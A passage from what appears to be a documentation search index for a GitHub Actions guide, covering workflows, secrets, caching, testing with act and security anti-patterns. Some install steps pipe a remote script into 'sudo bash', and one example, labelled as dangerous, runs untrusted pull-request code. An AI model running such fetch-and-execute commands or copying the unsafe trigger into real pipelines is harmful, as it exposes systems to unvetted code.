matrix:\n        os: [ubuntu-latest, macos-latest, windows-latest]\n        node-version: [16, 18, 20]\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js ${{ matrix.node-version }}\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node-version }}\n\n      - run: npm ci\n      - run: npm test\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#matrix-with-includeexclude","title":"Matrix with Include/Exclude","text":"<pre><code>jobs:\n  test:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n        node-version: [16, 18, 20]\n        include:\n          - os: ubuntu-latest\n            node-version: 18\n            experimental: true\n        exclude:\n          - os: macos-latest\n            node-version: 16\n\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node-version }}\n      - run: npm ci\n      - run: npm test\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#environment-variables-and-secrets","title":"Environment Variables and Secrets","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#environment-variables","title":"Environment Variables","text":"<pre><code>env:\n  NODE_ENV: production\n  API_URL: https://api.example.com\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    env:\n      BUILD_NUMBER: ${{ github.run_number }}\n\n    steps:\n      - name: Build with environment\n        run: npm run build\n        env:\n          FEATURE_FLAG: enabled\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#using-secrets","title":"Using Secrets","text":"<pre><code>jobs:\n  deploy:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Deploy to AWS\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: |\n          aws s3 sync ./build s3://my-bucket\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#caching","title":"Caching","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#npm-cache","title":"NPM Cache","text":"<pre><code>steps:\n  - uses: actions/checkout@v4\n\n  - name: Setup Node.js\n    uses: actions/setup-node@v4\n    with:\n      node-version: '18'\n      cache: 'npm'\n\n  - run: npm ci\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#manual-cache","title":"Manual Cache","text":"<pre><code>steps:\n  - uses: actions/checkout@v4\n\n  - name: Cache dependencies\n    uses: actions/cache@v4\n    with:\n      path: |\n        ~/.npm\n        ~/.cache\n      key: ${{ runner.os }}-deps-${{ hashFiles('**/package-lock.json') }}\n      restore-keys: |\n        ${{ runner.os }}-deps-\n\n  - run: npm ci\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#artifacts","title":"Artifacts","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#upload-artifacts","title":"Upload Artifacts","text":"<pre><code>jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: npm run build\n\n      - name: Upload build artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: build-output\n          path: dist/\n          retention-days: 7\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#download-artifacts","title":"Download Artifacts","text":"<pre><code>jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - name: Download build artifacts\n        uses: actions/download-artifact@v4\n        with:\n          name: build-output\n          path: dist/\n\n      - name: Deploy\n        run: ./deploy.sh\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#conditional-execution","title":"Conditional Execution","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#if-conditions","title":"If Conditions","text":"<pre><code>jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    if: github.ref == 'refs/heads/main' &amp;&amp; github.event_name == 'push'\n    steps:\n      - run: echo \"Deploying to production\"\n\n  notify:\n    runs-on: ubuntu-latest\n    if: failure()\n    steps:\n      - name: Send failure notification\n        run: echo \"Build failed\"\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#step-conditions","title":"Step Conditions","text":"<pre><code>steps:\n  - name: Run only on main branch\n    if: github.ref == 'refs/heads/main'\n    run: echo \"Main branch\"\n\n  - name: Run only on pull requests\n    if: github.event_name == 'pull_request'\n    run: echo \"Pull request\"\n\n  - name: Run only on tags\n    if: startsWith(github.ref, 'refs/tags/')\n    run: echo \"Tag build\"\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#docker-in-github-actions","title":"Docker in GitHub Actions","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#building-docker-images","title":"Building Docker Images","text":"<pre><code>jobs:\n  docker:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n\n      - name: Login to Docker Hub\n        uses: docker/login-action@v3\n        with:\n          username: ${{ secrets.DOCKER_USERNAME }}\n          password: ${{ secrets.DOCKER_PASSWORD }}\n\n      - name: Build and push\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          push: true\n          tags: |\n            myapp:latest\n            myapp:${{ github.sha }}\n          cache-from: type=registry,ref=myapp:buildcache\n          cache-to: type=registry,ref=myapp:buildcache,mode=max\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#reusable-workflows","title":"Reusable Workflows","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#calling-a-reusable-workflow","title":"Calling a Reusable Workflow","text":"<pre><code>## .github/workflows/ci.yml\nname: CI\n\non: [push, pull_request]\n\njobs:\n  call-test-workflow:\n    uses: ./.github/workflows/test.yml\n    with:\n      node-version: '18'\n    secrets: inherit\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#reusable-workflow-definition","title":"Reusable Workflow Definition","text":"<pre><code>## .github/workflows/test.yml\nname: Test\n\non:\n  workflow_call:\n    inputs:\n      node-version:\n        required: true\n        type: string\n    secrets:\n      NPM_TOKEN:\n        required: false\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js ${{ inputs.node-version }}\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ inputs.node-version }}\n\n      - run: npm ci\n      - run: npm test\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#composite-actions","title":"Composite Actions","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#creating-a-composite-action","title":"Creating a Composite Action","text":"<pre><code>## .github/actions/setup-app/action.yml\nname: 'Setup Application'\ndescription: 'Install dependencies and build'\n\ninputs:\n  node-version:\n    description: 'Node.js version'\n    required: true\n    default: '18'\n\nruns:\n  using: 'composite'\n  steps:\n    - name: Setup Node.js\n      uses: actions/setup-node@v4\n      with:\n        node-version: ${{ inputs.node-version }}\n        cache: 'npm'\n\n    - name: Install dependencies\n      run: npm ci\n      shell: bash\n\n    - name: Build\n      run: npm run build\n      shell: bash\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#using-composite-action","title":"Using Composite Action","text":"<pre><code>jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: ./.github/actions/setup-app\n        with:\n          node-version: '18'\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#testing","title":"Testing","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#testing-workflows-locally-with-act","title":"Testing Workflows Locally with act","text":"<p>Use act to test GitHub Actions workflows locally:</p> <pre><code>## Install act\nbrew install act  # macOS\n# Or download from https://github.com/nektos/act/releases\n\n## Run all workflows\nact\n\n## Run specific event\nact push\nact pull_request\nact workflow_dispatch\n\n## Run specific job\nact -j test\n\n## Run with specific runner\nact -P ubuntu-latest=catthehacker/ubuntu:act-latest\n\n## Dry run to see what would execute\nact -n\n\n## Run with secrets\nact -s GITHUB_TOKEN=ghp_xxx\n\n## Use secrets file\nact --secret-file .secrets\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#workflow-testing-best-practices","title":"Workflow Testing Best Practices","text":"<pre><code>## .github/workflows/test-workflow.yml\nname: Test Workflow\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n  workflow_dispatch:  # Enable manual testing\n\njobs:\n  validate:\n    name: Validate Workflow Syntax\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Validate workflow files\n        run: |\n          for file in .github/workflows/*.yml; do\n            echo \"Validating $file\"\n            yamllint \"$file\"\n          done\n\n  test-action:\n    name: Test Custom Action\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Test action\n        uses: ./.github/actions/custom-action\n        with:\n          test-mode: true\n\n      - name: Verify action output\n        run: |\n          if [ -z \"${{ steps.test-action.outputs.result }}\" ]; then\n            echo \"Action failed to produce output\"\n            exit 1\n          fi\n\n  matrix-test:\n    name: Test Matrix Strategy\n    runs-on: ${{ matrix.os }}\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu-latest, macos-latest, windows-latest]\n        node-version: [18, 20]\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node-version }}\n\n      - name: Run tests\n        run: npm test\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#testing-custom-actions","title":"Testing Custom Actions","text":"<p>Create tests for custom actions:</p> <pre><code>## .github/actions/custom-action/action.yml\nname: Custom Action\ndescription: Example custom action with testing\n\ninputs:\n  input-value:\n    description: Test input\n    required: true\n\noutputs:\n  result:\n    description: Action result\n    value: ${{ steps.process.outputs.result }}\n\nruns:\n  using: composite\n  steps:\n    - name: Validate input\n      shell: bash\n      run: |\n        if [ -z \"${{ inputs.input-value }}\" ]; then\n          echo \"Error: input-value is required\"\n          exit 1\n        fi\n\n    - name: Process input\n      id: process\n      shell: bash\n      run: |\n        result=\"Processed: ${{ inputs.input-value }}\"\n        echo \"result=$result\" &gt;&gt; $GITHUB_OUTPUT\n</code></pre> <p>Test file for custom action:</p> <pre><code>## .github/workflows/test-custom-action.yml\nname: Test Custom Action\n\non:\n  pull_request:\n    paths:\n      - '.github/actions/**'\n  workflow_dispatch:\n\njobs:\n  test-valid-input:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Test with valid input\n        id: valid\n        uses: ./.github/actions/custom-action\n        with:\n          input-value: \"test-value\"\n\n      - name: Verify output\n        run: |\n          expected=\"Processed: test-value\"\n          actual=\"${{ steps.valid.outputs.result }}\"\n          if [ \"$actual\" != \"$expected\" ]; then\n            echo \"Expected: $expected\"\n            echo \"Got: $actual\"\n            exit 1\n          fi\n\n  test-missing-input:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Test with missing input (should fail)\n        id: invalid\n        continue-on-error: true\n        uses: ./.github/actions/custom-action\n        with:\n          input-value: \"\"\n\n      - name: Verify failure\n        run: |\n          if [ \"${{ steps.invalid.outcome }}\" != \"failure\" ]; then\n            echo \"Action should have failed with empty input\"\n            exit 1\n          fi\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#integration-testing","title":"Integration Testing","text":"<p>Test workflow integration with external services:</p> <pre><code>## .github/workflows/integration-test.yml\nname: Integration Tests\n\non:\n  schedule:\n    - cron: '0 0 * * *'  # Daily\n  workflow_dispatch:\n\njobs:\n  test-docker-build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build Docker image\n        run: docker build -t test-app:${{ github.sha }} .\n\n      - name: Test container\n        run: |\n          docker run -d --name test-container test-app:${{ github.sha }}\n          sleep 5\n          docker exec test-container curl -f http://localhost:3000/health\n\n      - name: Cleanup\n        if: always()\n        run: |\n          docker stop test-container || true\n          docker rm test-container || true\n\n  test-deployment:\n    runs-on: ubuntu-latest\n    environment: staging\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy to staging\n        run: |\n          # Deploy to staging environment\n          echo \"Deploying to staging...\"\n\n      - name: Run smoke tests\n        run: |\n          # Verify deployment\n          curl -f https://staging.example.com/health\n\n      - name: Rollback on failure\n        if: failure()\n        run: |\n          # Rollback deployment\n          echo \"Rolling back deployment...\"\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#performance-testing","title":"Performance Testing","text":"<p>Test workflow performance and efficiency:</p> <pre><code>## .github/workflows/performance-test.yml\nname: Workflow Performance\n\non:\n  pull_request:\n    paths:\n      - '.github/workflows/**'\n  workflow_dispatch:\n\njobs:\n  measure-performance:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Measure cache effectiveness\n        uses: actions/cache@v4\n        with:\n          path: |\n            ~/.npm\n            node_modules\n          key: ${{ runner.os }}-npm-${{ hashFiles('package-lock.json') }}\n\n      - name: Install dependencies (with timing)\n        run: |\n          start_time=$(date +%s)\n          npm ci\n          end_time=$(date +%s)\n          duration=$((end_time - start_time))\n          echo \"Install took ${duration}s\"\n\n          if [ \"$duration\" -gt 120 ]; then\n            echo \"::warning::Install taking longer than expected (${duration}s &gt; 120s)\"\n          fi\n\n      - name: Check workflow file size\n        run: |\n          for file in .github/workflows/*.yml; do\n            size=$(wc -l &lt; \"$file\")\n            echo \"$file: $size lines\"\n            if [ \"$size\" -gt 300 ]; then\n              echo \"::warning::$file is large ($size lines), consider splitting\"\n            fi\n          done\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#reusable-workflow-testing","title":"Reusable Workflow Testing","text":"<p>Test reusable workflows:</p> <pre><code>## .github/workflows/reusable-test.yml\nname: Reusable Test Workflow\n\non:\n  workflow_call:\n    inputs:\n      environment:\n        required: true\n        type: string\n      test-suite:\n        required: false\n        type: string\n        default: 'all'\n    outputs:\n      test-result:\n        description: Test execution result\n        value: ${{ jobs.test.outputs.result }}\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    outputs:\n      result: ${{ steps.run-tests.outputs.result }}\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run tests\n        id: run-tests\n        run: |\n          echo \"Testing environment: ${{ inputs.environment }}\"\n          echo \"Test suite: ${{ inputs.test-suite }}\"\n\n          # Run tests\n          npm test\n\n          echo \"result=success\" &gt;&gt; $GITHUB_OUTPUT\n</code></pre> <p>Call and test reusable workflow:</p> <pre><code>## .github/workflows/test-reusable.yml\nname: Test Reusable Workflow\n\non:\n  pull_request:\n  workflow_dispatch:\n\njobs:\n  call-reusable:\n    uses: ./.github/workflows/reusable-test.yml\n    with:\n      environment: staging\n      test-suite: integration\n\n  verify-output:\n    needs: call-reusable\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check test result\n        run: |\n          result=\"${{ needs.call-reusable.outputs.test-result }}\"\n          if [ \"$result\" != \"success\" ]; then\n            echo \"Tests failed\"\n            exit 1\n          fi\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#cicd-pipeline-testing","title":"CI/CD Pipeline Testing","text":"<p>Complete pipeline test:</p> <pre><code>## .github/workflows/ci-cd-test.yml\nname: CI/CD Pipeline Test\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Lint workflows\n        run: |\n          yamllint .github/workflows/\n\n  unit-test:\n    runs-on: ubuntu-latest\n    needs: lint\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run unit tests\n        run: npm test\n\n  integration-test:\n    runs-on: ubuntu-latest\n    needs: unit-test\n    services:\n      postgres:\n        image: postgres:15\n        env:\n          POSTGRES_PASSWORD: postgres\n        options: &gt;-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run integration tests\n        env:\n          DATABASE_URL: postgresql://postgres:postgres@postgres:5432/test\n        run: npm run test:integration\n\n  e2e-test:\n    runs-on: ubuntu-latest\n    needs: integration-test\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run E2E tests\n        run: npm run test:e2e\n\n  build:\n    runs-on: ubuntu-latest\n    needs: e2e-test\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build application\n        run: npm run build\n\n      - name: Upload artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: build-artifacts\n          path: dist/\n\n  deploy-staging:\n    runs-on: ubuntu-latest\n    needs: build\n    if: github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main'\n    environment:\n      name: staging\n      url: https://staging.example.com\n    steps:\n      - name: Download artifacts\n        uses: actions/download-artifact@v4\n        with:\n          name: build-artifacts\n\n      - name: Deploy to staging\n        run: |\n          echo \"Deploying to staging...\"\n          # Deployment commands\n\n      - name: Smoke test\n        run: |\n          curl -f https://staging.example.com/health\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#testing-with-secrets-and-environment-variables","title":"Testing with Secrets and Environment Variables","text":"<pre><code>## .github/workflows/test-secrets.yml\nname: Test Secrets Handling\n\non:\n  workflow_dispatch:\n\njobs:\n  test-secrets:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Verify required secrets exist\n        env:\n          API_KEY: ${{ secrets.API_KEY }}\n          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}\n        run: |\n          if [ -z \"$API_KEY\" ]; then\n            echo \"Error: API_KEY secret not set\"\n            exit 1\n          fi\n\n          if [ -z \"$DB_PASSWORD\" ]; then\n            echo \"Error: DB_PASSWORD secret not set\"\n            exit 1\n          fi\n\n          echo \"All required secrets are configured\"\n\n      - name: Test secret masking\n        run: |\n          # Secrets should be masked in logs\n          echo \"Testing secret handling...\"\n          # Never echo secrets directly!\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#workflow-validation-in-ci","title":"Workflow Validation in CI","text":"<p>Add workflow validation to your CI:</p> <pre><code>## .github/workflows/validate-workflows.yml\nname: Validate Workflows\n\non:\n  pull_request:\n    paths:\n      - '.github/workflows/**'\n      - '.github/actions/**'\n\njobs:\n  actionlint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install actionlint\n        run: |\n          bash &lt;(curl https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)\n\n      - name: Run actionlint\n        run: |\n          ./actionlint -color\n\n  yamllint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Lint YAML files\n        run: |\n          yamllint .github/workflows/\n          yamllint .github/actions/\n\n  test-with-act:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup act\n        run: |\n          curl https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash\n\n      - name: Dry run workflows\n        run: |\n          act -n pull_request\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#security-best-practices","title":"Security Best Practices","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#pin-action-versions","title":"Pin Action Versions","text":"<pre><code>## Good - Pinned to commit SHA\n- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1\n\n## Acceptable - Pinned to major version\n- uses: actions/checkout@v4\n\n## Avoid - Using mutable tags\n- uses: actions/checkout@main\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#minimal-permissions","title":"Minimal Permissions","text":"<pre><code>name: CI\n\non: [push]\n\npermissions:\n  contents: read\n  pull-requests: write\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#anti-patterns","title":"Anti-Patterns","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#avoid-hardcoded-secrets","title":"\u274c Avoid: Hardcoded Secrets","text":"<pre><code>## Bad - Hardcoded secret\n- run: echo \"API_KEY=abc123\" &gt;&gt; .env\n\n## Good - Use GitHub Secrets\n- run: echo \"API_KEY=${{ secrets.API_KEY }}\" &gt;&gt; .env\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#avoid-running-untrusted-code","title":"\u274c Avoid: Running Untrusted Code","text":"<pre><code>## Bad - Executing PR code without review\non:\n  pull_request_target:\n    types: [opened]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm install\n      - run: npm test  # Dangerous!\n\n## Good - Use pull_request for external PRs\non:\n  pull_request:\n    types: [opened]\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#avoid-no-caching","title":"\u274c Avoid: No Caching","text":"<pre><code>## Bad - No caching\n- run: npm ci\n\n## Good - With caching\n- uses: actions/setup-node@v4\n  with:\n    node-version: '18'\n    cache: 'npm'\n- run: npm ci\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#avoid-using-mutable-action-tags","title":"\u274c Avoid: Using Mutable Action Tags","text":"<pre><code>## Bad - Using mutable tags (can change unexpectedly)\n- uses: actions/checkout@main  # \u274c Can change anytime\n- uses: actions/setup-node@v4  # \u274c Major version can get updates\n\n## Good - Pin to specific SHA\n- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1\n- uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8  # v4.0.2\n\n## Or use tags with SHA comment for clarity\n- uses: actions/checkout@v4.1.1  # SHA: b4ffde65f46336ab88eb53be808477a3936bae11\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#avoid-overly-permissive-permissions","title":"\u274c Avoid: Overly Permissive Permissions","text":"<pre><code>## Bad - Default permissions (read/write to everything)\nname: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    # No permissions specified - gets all permissions!\n\n## Good - Minimal permissions\nname: CI\non: [push]\npermissions:\n  contents: read  # \u2705 Only read access\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test\n\n  release:\n    needs: build\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write  # \u2705 Write only where needed\n      packages: write\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm publish\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#avoid-not-using-concurrency-controls","title":"\u274c Avoid: Not Using Concurrency Controls","text":"<pre><code>## Bad - Multiple workflow runs can conflict\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./deploy.sh  # \u274c Multiple deploys can run simultaneously!\n\n## Good - Prevent concurrent runs\non:\n  push:\n    branches: [main]\n\nconcurrency:\n  group: deploy-${{ github.ref }}\n  cancel-in-progress: false  # \u2705 Wait for current to finish\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./deploy.sh\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#avoid-not-setting-timeout-limits","title":"\u274c Avoid: Not Setting Timeout Limits","text":"<pre><code>## Bad - No timeout (can run forever)\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test  # \u274c Could hang indefinitely\n\n## Good - Set reasonable timeouts\njobs:\n  test:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10  # \u2705 Fail after 10 minutes\n    steps:\n      - run: npm test\n        timeout-minutes: 5  # \u2705 Per-step timeout too\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#tool-configuration","title":"Tool Configuration","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#act-local-github-actions-testing","title":"act - Local GitHub Actions Testing","text":"<p>Install and configure act for local workflow testing:</p> <pre><code>## Install act (macOS)\nbrew install act\n\n## Install act (Linux)\ncurl https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash\n\n## Run default event (push)\nact\n\n## Run specific event\nact pull_request\n\n## Run specific job\nact -j build\n\n## Run with secrets file\nact --secret-file .secrets\n\n## List workflows\nact -l\n\n## Dry run\nact -n\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#actrc-configuration","title":".actrc Configuration","text":"<pre><code>## .actrc\n-P ubuntu-latest=catthehacker/ubuntu:act-latest\n-P ubuntu-22.04=catthehacker/ubuntu:act-22.04\n-P ubuntu-20.04=catthehacker/ubuntu:act-20.04\n--container-architecture linux/amd64\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#actionlint-workflow-linter","title":"actionlint - Workflow Linter","text":"<pre><code>## Install actionlint\nbrew install actionlint\n\n## Lint all workflows\nactionlint\n\n## Lint specific workflow\nactionlint .github/workflows/ci.yml\n\n## Show available checks\nactionlint -list\n\n## Output as JSON\nactionlint -format '{{json .}}'\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#githubactionlintyml","title":".github/actionlint.yml","text":"<pre><code>## .github/actionlint.yml\nself-hosted-runner:\n  labels:\n    - self-hosted\n    - linux\n    - x64\n\nconfig-variables:\n  # Define repository variables\n  - DEPLOY_ENV\n  - API_ENDPOINT\n\nshellcheck:\n  enable: true\n  shell-options: -e\n\npyflakes:\n  enable: true\n  python-version: '3.11'\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#vs-code-settings","title":"VS Code Settings","text":"<pre><code>{\n  \"files.associations\": {\n    \"*.yml\": \"yaml\",\n    \".github/workflows/*.yml\": \"github-actions-workflow\"\n  },\n  \"[github-actions-workflow]\": {\n    \"editor.defaultFormatter\": \"redhat.vscode-yaml\",\n    \"editor.formatOnSave\": true\n  },\n  \"yaml.schemas\": {\n    \"https://json.schemastore.org/github-workflow.json\": [\n      \".github/workflows/*.yml\",\n      \".github/workflows/*.yaml\"\n    ]\n  },\n  \"yaml.customTags\": [\n    \"!reference sequence\"\n  ]\n}\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#pre-commit-hooks","title":"Pre-commit Hooks","text":"<pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n        files: \\.github/workflows/.*\\.ya?ml$\n      - id: check-added-large-files\n\n  - repo: https://github.com/adrienverge/yamllint\n    rev: v1.35.1\n    hooks:\n      - id: yamllint\n        files: \\.github/workflows/.*\\.ya?ml$\n\n  - repo: https://github.com/rhysd/actionlint\n    rev: v1.6.27\n    hooks:\n      - id: actionlint\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#github-actions-workflow-for-validation","title":"GitHub Actions Workflow for Validation","text":"<pre><code>name: Workflow Validation\n\non:\n  pull_request:\n    paths:\n      - '.github/workflows/**'\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run actionlint\n        uses: raven-actions/actionlint@v1\n        with:\n          fail-on-error: true\n\n      - name: Validate workflow syntax\n        run: |\n          for workflow in .github/workflows/*.yml; do\n            echo \"Validating $workflow\"\n            yamllint \"$workflow\"\n          done\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#makefile","title":"Makefile","text":"<pre><code>## Makefile\n.PHONY: act-list act-push act-pr lint-workflows\n\nact-list:\n act -l\n\nact-push:\n act push\n\nact-pr:\n act pull_request\n\nact-dry:\n act -n\n\nlint-workflows:\n actionlint\n\nvalidate-workflows:\n yamllint .github/workflows/*.yml\n actionlint\n\ntest-workflow:\n act -j $(JOB)\n\n## Example: make test-workflow JOB=build\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#secrets-file-for-act","title":".secrets File (for act)","text":"<pre><code>## .secrets\n## DO NOT commit this file - add to 